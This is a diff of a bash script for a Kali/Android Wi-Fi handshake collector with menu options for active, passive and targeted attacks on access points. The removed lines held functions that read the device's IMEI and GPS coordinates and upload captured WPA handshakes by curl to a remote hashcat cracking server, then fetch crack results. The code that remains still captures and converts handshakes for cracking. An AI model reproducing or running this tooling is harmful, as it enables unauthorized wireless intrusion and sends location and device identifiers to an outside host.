@@ -25,47 +25,14 @@ checkUtils(){
                 exit 1
         fi
 
-        #cap2hccapx
-        output=`cap2hccapx 2>&1`
-        if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
-                printf "cap2hccapx....\033[32m Done\033[0m\n"
-        else
-                printf "cap2hccapx....\033[31m Fail\033[0m\n"
-                exit 1
-        fi
 
         printf "\n"
 }
 
 
-checkServer(){
-        curl http://$serverAddr/handshakes &> /dev/null
-        if [[ $? == 0 ]]; then
-                printf "Server status - \033[32mworking \033[0m\n"
-        else
-                printf "Server status - \033[31mnot working\033[0m\n"
-                serverAddr=""
-                exit 1
-        fi
-}
 
-sendHandshake() {
-        trap 'cleanup' EXIT
-    
-        long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $16}')
-        echo "Long: "$long
-        lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
-        echo "Lat: "$lat
-        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
-        echo "IMEI: "$imei
-        echo $1
-        curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $1" -H "Content-Type: multipart/form-data" -F "file=@./shakes/$1" http://$serverAddr/task
-        if [[ $? == 0 ]]; then
-                rm ./shakes/$1
-        else
-                echo "Failed send file $1"
-        fi
-}
+
+
 
 checkHandshakes() {
         trap 'cleanup' EXIT
@@ -77,18 +44,16 @@ checkHandshakes() {
                 output=$(cap2hccapx /home/kali/hscollector/cleancap.cap /home/kali/hscollector/cleanshakes.hccapx)
                 echo $output
                 if [[ "$output" != *"Written 0"* ]]; then
-                        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
                         printf "\033[32mHandshakes detected!!!\033[0m\n"
                         time=$(date +%s)
-                        filename="shake-$time-$imei"
+                        filename="shake-$time"
                         if [[ -d /home/kali/hscollector/shakes ]]; then
-                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time-$imei
+                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time
                         else
                                 mkdir /home/kali/hscollector/shakes
                                 chmod 777 -R /home/kali/hscollector/shakes
-                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time-$imei
+                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time
                         fi
-                        sendHandshake $filename
                  else
                         printf "\033[31mNo handshakes\033[0m\n"
                         rm /home/kali/hscollector/cleanshakes.hccapx >/dev/null
@@ -177,23 +142,19 @@ attackSpecific(){
             rm /home/kali/hscollector/shakes* &>/dev/null
 }
 
-getresults(){
-        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
-        curl -H "imei: $imei" $serverAddr/progress
-        curl -H "imei: $imei" $serverAddr/results
-}
+
 
 getparams(){
         printf "Please select an action:\n"
-        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\n4) Attack a specific point\nEnter: "
+        printf "1) Start active attack\n2) Start passive attack\n3) Attack a specific point\nEnter: "
         read;
         re='^[0-9]+$'
-        if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >4 ]]; then
+        if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >3 ]]; then
                 printf "Invalid input.\n"
                 getparams
         fi
         command=${REPLY}
-        if [[ $command == 1 ]] || [[ $command == 2 ]] || [[ $command == 4 ]];then
+        if [[ $command == 1 ]] || [[ $command == 2 ]] || [[ $command == 3 ]];then
                 if [[ $interface != "" ]] && [[ $serverAddr != "" ]];then
                         if [[ $command == 1 ]];then
                                 active
@@ -201,9 +162,8 @@ getparams(){
                         fi
                         if [[ $command == 2 ]];then
                                 passive
-                                
                         fi
-                        if [[ $command == 4 ]]
+                        if [[ $command == 3 ]]
                         then
                                 attackSpecific
                                 getparams
@@ -224,7 +184,6 @@ getparams(){
                         printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\nEnter: "
                         read;
                         serverAddr=${REPLY}
-                        checkServer
                         if [[ $command == 1 ]];then
                                 active
                                 getparams
@@ -248,7 +207,6 @@ getparams(){
                         printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\nEnter: "
                         read;
                         serverAddr=${REPLY}
-                        checkServer
                         getresults
                 fi
                 getparams
@@ -275,7 +233,6 @@ fi
 
 main(){
         checkUtils
-        chroot /proc/1/cwd/ settings put secure location_mode 3
         getparams
         cleanup
 }
@@ -284,28 +241,22 @@ main(){
 
 
 if [[ $1 != "" ]] && [[ $2 != "" ]] && [[ $3 != "" ]];then
-                chroot /proc/1/cwd/ settings put secure location_mode 3
                 interface=$2
                 serverAddr=$3
                 checkUtils
                 airmon-ng start $interface >/dev/null
 
                 if [[ $1 == "a" ]];then
-                        checkServer
                         active
                 fi
                 if [[ $1 == "p" ]];then
-                        checkServer
                         passive
 
                 fi
                 if [[ $1 == "s" ]];then
-                        checkServer
                         attackSpecific
                 fi
-                if [[ $1 == "r" ]];then
-                        getresults
-                fi
+                
                 exit 0
 
 fi
